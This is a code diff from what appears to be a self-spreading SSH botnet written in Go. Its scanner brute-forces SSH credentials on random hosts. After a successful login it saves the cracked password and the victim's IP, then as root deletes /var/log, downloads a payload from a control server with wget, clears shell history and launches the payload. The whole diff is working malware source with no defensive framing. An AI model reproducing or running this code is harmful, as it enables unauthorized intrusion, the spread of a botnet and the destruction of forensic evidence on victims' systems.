@@ -207,11 +207,14 @@ func sshConfig(sshName, sshPass string) *ssh.ClientConfig {
 	return config
 }
 
-func (b *Bot) sshExecute(comd string) {
+func (b *Bot) sshExecute(comd string, isRoot bool) {
 	sshSession, _ := b.session.NewSession()
 	var setSession bytes.Buffer
 	sshSession.Stdout = &setSession
-	sshSession.Run("echo " + b.password + " | sudo -S " + comd)
+	if isRoot {
+		sshSession.Run("echo '" + b.password + "' | sudo -S " + comd)
+	}
+	sshSession.Run(comd)
 	sshSession.Close()
 }
 
@@ -252,7 +255,7 @@ func (b *Bot) Scanner(modes []string, isRandom bool) {
 			if rtnIP == "" {
 				checkPort(ip)
 			} else {
-				b.Report("Try to login: " + rtnIP)
+				b.Report("🛎 Try to login: " + rtnIP)
 				var isLogin bool
 				for user := range userList {
 					for paswd := range paswdList {
@@ -264,21 +267,26 @@ func (b *Bot) Scanner(modes []string, isRandom bool) {
 						b.password = paswdList[paswd]
 						if err == nil {
 							b.payload = name('a')
-							b.Report("Login success: " + rtnIP)
-							b.sshExecute("rm -rf /var/log/; wget -O ." + b.payload + " " + b.pServer + "; history -c; rm ~/.bash_history")
-							b.Report("Installing bot: " + rtnIP)
-							go b.sshExecute("chmod 700 ." + b.payload + " && ./." + b.payload)
+							b.Report("🏳 Login success: " + rtnIP)
+							b.sshExecute("touch /tmp/.ffff; printf \""+b.password+"\\n"+rtnIP+"\\n\""+" > /tmp/.ffff", false) //Store public IP for handle a NAT.
+							b.Report("🏳 Installing bot: " + rtnIP)
+							b.sshExecute("rm -rf /var/log/; wget -O ."+b.payload+" "+b.pServer+"; history -c; rm ~/.bash_history", true)
+							b.sshExecute("chmod 700 ."+b.payload, true)
+							go b.sshExecute("./."+b.payload+" &", true)
 							isLogin = true
 						} else {
-							b.Report("Failed to login: " + rtnIP + " > " + fmt.Sprintf("%v:%v", userList[user], paswdList[paswd]))
+							b.Report("🗑 Failed to login: " + rtnIP + " > " + fmt.Sprintf("%v:%v", userList[user], paswdList[paswd]))
 						}
 					}
 				}
 				continue
 			}
+			if ScanSwitch {
+				break
+			}
 		}
 		if ScanSwitch {
-			b.Report("STOP SCANNING.")
+			b.Report("🛎 STOP SCANNING.")
 			break
 		}
 	}
